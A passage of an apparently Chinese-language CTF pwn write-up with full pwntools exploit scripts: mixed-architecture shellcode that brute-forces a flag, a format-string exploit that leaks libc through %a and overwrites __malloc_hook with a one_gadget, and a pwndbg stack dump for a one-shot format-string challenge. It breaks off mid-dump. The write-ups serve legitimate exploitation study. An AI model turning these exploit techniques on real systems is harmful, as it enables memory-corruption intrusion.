class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040405E</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag += <span class="string">F&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmp byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>], <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">ja loop</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">shellcode_open_x86 = asm(shellcode_open_x86, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax /*set r9*/</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*syscall*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x56],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">shellcode = shellcode_mmap</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_retfq</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode = asm(shellcode, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(shellcode_open_x86 + shellcode_read_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">start = time.time()</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> left &lt; right :</span><br><span class="line">mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">right = mid</span><br><span class="line">io.close()</span><br><span class="line">flag += possible_list[left]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br><span class="line">end = time.time()</span><br><span class="line">success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上找的exp,看了一下,每一段代码都有使用smc,但实际上在mmap后如果调用一个read往新mmap的内存写上想要的指令就不需要smc了</p><p>即第一次需要smc时构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr,len....)</span><br><span class="line">read(0,addr,len)</span><br><span class="line">jmp addr</span><br></pre></td></tr></table></figure><h1 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h1><p><strong>标签:格式化字符串|printf触发malloc|%a占位符</strong></p><p>保护机制全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/easy_printf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>程序的主体就是两个printf的格式化字符串攻击,不过一个是正常的print但使用一次就会使用系统调用退出,还有一个是削弱了格式化字符串漏洞的__printf_chk函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy you the last time!&quot;</span>);</span><br><span class="line">  s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your fmt: &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">    s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">5uLL</span>)] = <span class="number">0</span>;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, s, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>比较常见的思路是先泄露栈再利用%n打rop,但因为printf只能使用一次就比较难办了</p><p>__printf_chk对格式化字符串的限制很大,几乎没有什么可利用的功能了</p><p>这就需要用到一个暂时还搞不太清楚原理的知识点,在__printf_chk函数格式化字符串用且只能用一个或者两个%a填充,能够打印出来stdin和stdout指针,以此泄露libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%a</span><br><span class="line">0x0.07f6e76f5498p-1022</span><br><span class="line">%a%a</span><br><span class="line">0x0.07ffa5ebb098p-10220x0.07ffa5ebb16ap-1022</span><br><span class="line">%a%a%a</span><br><span class="line">null</span><br></pre></td></tr></table></figure><p>虽然不太懂原理,而且本地另写一个程序并没有复现成功,但在应对__printf_chk时不失为一个尝试</p><p>此后还要利用printf在输出超过65535长度的内容时会触发malloc这个知识点,并以此为基础修改malloc_hook为one_gadget并触发</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr2</span>(<span class="params">offset, addr, data, written</span>):</span><br><span class="line"><span class="keyword">global</span> cnt = <span class="number">0</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">address = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">cur = x</span><br><span class="line"><span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">round</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add).encode()</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>).encode()</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">written += to_add</span><br><span class="line">payload += <span class="built_in">round</span></span><br><span class="line">address += p64(addr+cnt)</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line"><span class="comment"># trigger malloc</span></span><br><span class="line"><span class="keyword">return</span> (payload+<span class="string">b&quot;%65537c&quot;</span>).ljust(<span class="number">0x50</span>,<span class="string">b&quot;_&quot;</span>) + address</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your fmt: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%a%a\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc.address = (<span class="built_in">int</span>(p.recv(<span class="number">11</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">hook_addr=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(hook_addr))</span><br><span class="line">one=libc.address+<span class="number">0xe3b04</span></span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = fmtstr2(<span class="number">6</span>,hook_addr,p64(one)[:<span class="number">6</span>],<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里看ruan师傅的exp还学到了格式化字符串的%n的一个新姿势</p><p>即%hhn只写一个字节,如果写的数大于255那么只保留最后一个字节的数据</p><p>以此来稳定构造格式化字符串任意写</p><h1 id="2020tctf-simple-echoserver"><a href="#2020tctf-simple-echoserver" class="headerlink" title="2020tctf-simple_echoserver"></a>2020tctf-simple_echoserver</h1><p><strong>标签:格式化字符串|*占位符</strong></p><p>checksec发现保护全开</p><p>看一下程序的流程,读入name和phonenumber</p><p>拼接格式化字符串后由stderr输出,此处存在格式化字符串漏洞,不过只能利用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_13C1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(byte_4060, <span class="number">0x100</span>uLL, <span class="string">&quot;[USER] name: %s; phone: %ld\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1, *(_QWORD *)(a1 + <span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, byte_4060);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是要一次利用printf的机会就完成利用,这就难办了</p><p>在没有其他帮助下,正常来说应该最少要两次格式化字符串利用才能完成利用</p><p>这里学到一个新姿势<code>*占位符</code>,*占位符以对应的函数参数的值作为一次变量输出的宽度</p><p>例如<code>printf(&quot;%*c%n&quot;,123,&#39;a&#39;,&amp;var);</code>就会输出123宽度的字符a</p><p>结合*??$即可获取栈上任意的值作为宽度</p><p>但这又有什么用呢?</p><p>如果我们结合%n,那么加上之前输出的宽度,岂不是可以在无输出的情况下完整的写一个地址</p><p>那么思路就有了</p><p>断点下在fprintf处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff7221d658</span> —▸ <span class="number">0x55d2c7dcf41a</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff7221d660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fff7221d668</span> —▸ <span class="number">0x55d2c7dd2160</span> ◂— <span class="string">&#x27;%*48$c%801983c%26$n%221c%7$hhn&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fff7221d670</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff7221d678</span> —▸ <span class="number">0x55d2c7dcf443</span> ◂— lea rdi, [rip + <span class="number">0xc5b</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff7221d680</span> —▸ <span class="number">0x7fe104ff78a0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff7221d688</span> —▸ <span class="number">0x7fe104e9fb9f</span> (_IO_file_underflow+<span class="number">383</span>) ◂— test rax, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff7221d690</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fff7221d698</span> —▸ <span class="number">0x7fe104e70d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fff7221d6a0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7fff7221d6a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x7fff7221d6b0</span> ◂— <span class="number">0x40584a0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7fff7221d6b8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x7fff7221d6c0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0x7fff7221d6c8</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x7fff7221d6d0</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0x7fff7221d6d8</span> —▸ <span class="number">0x55d2c7dcf0f0</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│     <span class="number">0x7fff7221d6e0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│     <span class="number">0x7fff7221d6e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│     <span class="number">0x7fff7221d6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│     <span class="number">0x7fff7221d6f8</span> —▸ <span class="number">0x55d2c7dcf348</span> ◂— mov rcx, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│     <span class="number">0x7fff7221d700</span> —▸ <span class="number">0x7fe104ff84a0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0x7fff7221d708</span> —▸ <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0x7fff7221d710</span> ◂— <span class="string">&#x27;111111111111111111111111&#x27;</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fff7221d730</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fff7221d738</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fff7221d740</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│     <span class="number">0x7fff7221d748</span> —▸ <span class="number">0x55d2c7dcf28d</span> ◂— mov r12d, eax</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fff7221d750</span> ◂— <span class="number">0x100c7dcf4e0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│     <span class="number">0x7fff7221d758</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│     <span class="number">0x7fff7221d760</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7fff7221d768</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7fff7221d778</span> —▸ <span class="number">0x55d2c7dcf3b3</span> ◂— mov rdx, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7fff7221d780</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7fff7221d788</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│     <span class="number">0x7fff7221d798</span> —▸ <span class="number">0x55d2c7dcf4d0</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0x7fff7221d7a0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0x7fff7221d7a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2b</span>:<span 